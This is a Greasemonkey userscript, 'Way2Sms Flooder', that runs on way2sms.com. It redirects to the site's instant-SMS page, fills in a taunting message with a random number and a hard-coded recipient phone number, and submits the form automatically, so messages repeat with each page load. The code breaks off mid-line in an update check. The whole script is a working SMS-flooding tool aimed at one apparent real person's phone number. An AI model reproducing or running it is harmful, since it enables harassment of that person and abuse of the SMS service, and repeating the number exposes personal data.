var loc=window.location.hostname+"/jsp/InstantSMS.jsp?val=1";
loc ="http://"+loc;

document.location=loc;

// ==UserScript==
// @name           Way2Sms Flooder By SUNNY020
// @include        htt*://*.way2sms.com/*
// @description    Flood Unlimited Sms Site:-Way2sms.com 
// @version        0.0.1
// @copyright      SUNNY020
// @attribution http://userscripts.org/users/107937 (http://userscripts.org/scripts/show/57604)
// @attribution http://userscripts.org/users/107937 (http://userscripts.org/scripts/show/57605)
// @attribution http://userscripts.org/users/38602 (http://userscripts.org/scripts/show/20145)
// ==/UserScript==

	var number="number";
	document.forms[0].elements[4].value="\nhey who r u ??::" +Math.floor(Math.random()*22321313);
	document.forms[0].elements[6].value=9633087782
document.forms[0].submit();
	void(0);

var SUC_script_num = 57988; 
try{function updateCheck(forced){if ((forced) || (parseInt(GM_getValue('SUC_last_update', '0')) + 86400000 <= (new Date().getTime()))